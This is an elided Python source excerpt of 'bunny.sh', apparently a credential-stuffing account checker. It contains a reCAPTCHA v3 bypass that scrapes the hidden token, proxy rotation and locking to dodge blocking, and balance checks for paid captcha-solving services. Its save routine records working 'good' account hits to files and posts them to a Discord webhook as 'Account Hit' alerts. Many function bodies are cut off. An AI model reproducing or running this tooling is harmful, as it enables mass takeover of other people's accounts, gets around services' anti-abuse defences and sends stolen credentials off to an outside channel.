...
def ascii():
    """Prints ascii logo"""
    f = open("ascii.txt")
    print(f"    {cyan}{''.join([line for line in f])}{reset}")
    print(f"    {green}created by giovankes{reset}")
    print(f"    {dark_cyan}https://github.com/bunny-sh{reset}")
    print(f"    {dark_yellow}https://bunny.giotje.dev{reset}")
...
def bypass_recaptcha3(get_url: str, post_url: str, proxy: str):
    ...
    with Session() as s:
        ...
        token_1 = r.text.split('type="hidden" id="recaptcha-token" value="')[1].split(
            '"'
        )[0]
...
def save(name: str, saveType: str, time: str, content: str, use_webhook=True):
    ...
    """
    tree_name = Checker.tree_name
    if not os.path.exists(f"results/{tree_name}"):
        makedirs(f"results/{tree_name}", exist_ok=True)
    with Checker.save_lock:
        match saveType:
            case "custom":
                with open(
                    f"results/{tree_name}/{name}_custom.txt", "a", errors="ignore"
                ) as file:
                    file.write(content + "\n")
            case "good":
                with open(
                    f"results/{tree_name}/{name}_good.txt", "a", errors="ignore"
                ) as file:
                    file.write(content + "\n")
                if (
                    "https://discord.com/api/webhooks/" in Checker.discord_webhook
                    and use_webhook
                ):
                    webhook = DiscordWebhook(
                        url=Checker.discord_webhook,
                        username="Account Hit",
                        avatar_url="https://bunny.giotje.dev/public/icon.png",
                        rate_limit_retry=True,
                    )
                    embed = DiscordEmbed(
                        title=f"{name.title()} Account Hit",
                        colour="2a7fb7",
                        description=f"```{content}```",
                    )
                    embed.set_author(
                        name="giovankes",
                        url="https://bunny.giotje.dev",
                        icon_url="https://bunny.giotje.dev/public/icon.png",
                    )
                    embed.set_footer(text="made by giovankes")
                    webhook.add_embed(embed)
                    webhook.execute()
            case _:
                with open(
                    f"results/{tree_name}/{name}.txt", "a", errors="ignore"
                ) as file:
                    file.write(content + "\n")
...
def set_proxy(proxy: str = None, proxy_type: str = None):
    ...
    while 1:
        with Checker.proxy_lock:
            proxies = [
                proxy
                for proxy in Checker.proxies
                if proxy not in Checker.bad_proxies
                and proxy not in Checker.locked_proxies
            ]
            if not proxies:
                Checker.bad_proxies.clear()
                continue
...
def return_proxy(proxy):
    ...
    if not proxy:
        return
    with Checker.proxy_lock:
        if proxy in Checker.locked_proxies:
            Checker.locked_proxies.remove(proxy)
...
def lock_proxy(proxy):
    ...
    if not proxy:
        return
    if Checker.lockProxies and proxy not in Checker.locked_proxies:
        Checker.locked_proxies.append(proxy)
...
def cui(modules: int):
    ...
    while Checker.checking:
        with Checker.print_lock:
            ...
            print(
                f"""    {cyan}{modules}{reset} Loaded Module{'s' if modules > 1 else ''}
...
def title(modules: int):
    ...
    """
    while Checker.checking:
        Checker.title = f"bunny.sh | Good: {numerize(Checker.good)}  ~  Custom: {numerize(Checker.custom)}  ~  Bad: {numerize(Checker.bad)}  ~  Errors: {numerize(Checker.errors)}  ~  CPM: {numerize(get_cpm())}  ~  Remaining: {numerize(len(Checker.remaining)*modules)}"
...
def title_2():
    ...
    """
    while Checker.checking:
        Checker.title = f"bunny.sh | Good: {numerize(Checker.good)} ~ Bad: {numerize(Checker.bad)} ~ CPM: {numerize(get_cpm())} ~ Remaining: {numerize(len(Checker.remaining))}"
        change_title(Checker.title)
        sleep(0.1)
...
def save_lines():
    ...
    if Checker.checking:
        ...
        with open(f"results/{Checker.time}/remaining_lines.txt", "w") as file:
...
def get_solver_balance():
    ...
    match Checker.solver_serice:
        case "2captcha":
            try:
                balance = TwoCaptcha(Checker.api_key).balance()
            except:
                return invalid_key
            else:
                return f"{green}${round(float(balance),2)}{reset}"
        case "anticaptcha":
            ...
            try:
                ...
                return f"{green}${round(balance,2)}{reset}"
        case "anycaptcha":
